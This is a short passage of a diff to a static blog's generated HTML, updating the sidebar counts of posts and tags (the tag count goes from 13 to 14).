+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2056,7 +1886,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
